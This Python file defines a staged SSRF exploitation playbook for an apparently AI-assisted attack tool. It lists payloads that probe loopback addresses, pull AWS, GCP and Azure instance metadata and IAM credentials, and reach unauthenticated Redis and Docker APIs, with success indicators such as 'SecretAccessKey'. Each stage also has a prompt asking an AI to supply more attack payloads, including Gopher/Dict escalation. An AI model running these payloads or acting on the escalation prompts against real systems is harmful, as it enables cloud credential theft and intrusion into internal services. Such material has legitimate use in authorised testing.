from . import Playbook, ExploitStage, PayloadEntry

ssrf_playbook = Playbook(
    vuln_type="ssrf",
    description="Exploits Server-Side Request Forgery vulnerabilities.",
    stages=[
        ExploitStage(
            name="boundary_testing",
            description="Test internal access by bypassing basic validation.",
            payloads=[
                PayloadEntry("http://127.0.0.1:80", "Basic localhost loopback."),
                PayloadEntry("http://localhost:22", "Test generic port 22 access. Helpful to confirm connectability."),
                PayloadEntry("http://[::1]:80/", "IPv6 loopback bypass."),
                PayloadEntry("http://169.254.169.254/latest/meta-data/", "AWS Cloud metadata endpoint test.")
            ],
            success_indicators=["SSH-2.0-OpenSSH", "HTTP/1.1 200", "ami-id", "instance-id"],
            failure_indicators=["Connection refused", "Name or service not known", "blocked", "timeout"],
            next_stage_on_success="cloud_metadata",
            ai_escalation_prompt="SSRF basic confirmation succeeded. Suggest port scanning payloads or payloads to hit other internal critical IP ranges."
        ),
        ExploitStage(
            name="cloud_metadata",
            description="Attempt to extract cloud metadata or service credentials.",
            payloads=[
                PayloadEntry("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Role extraction."),
                PayloadEntry("http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata extraction."),
                PayloadEntry("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure Metadata extraction.")
            ],
            success_indicators=["AccessKeyId", "SecretAccessKey", "Token", "computeMetadata"],
            failure_indicators=["Timeout", "404 Not Found"],
            next_stage_on_success="internal_port_scan",
            ai_escalation_prompt="Suggest payloads to target specific cloud vendor endpoints, assuming the server might be hosted there."
        ),
        ExploitStage(
            name="internal_port_scan",
            description="Demonstrate port scanning of internal subnet.",
            payloads=[
                PayloadEntry("http://127.0.0.1:6379", "Test for Redis without auth."),
                PayloadEntry("http://127.0.0.1:2375", "Test for unauthenticated Docker API.")
            ],
            success_indicators=["redis_version", "Containers", "Images"],
            failure_indicators=["Connection refused"],
            next_stage_on_success=None,
            ai_escalation_prompt="Provide Gopher or Dict protocol payloads to communicate with internal Redis/Memcache if an HTTP SSRF is restricted."
        )
    ]
)
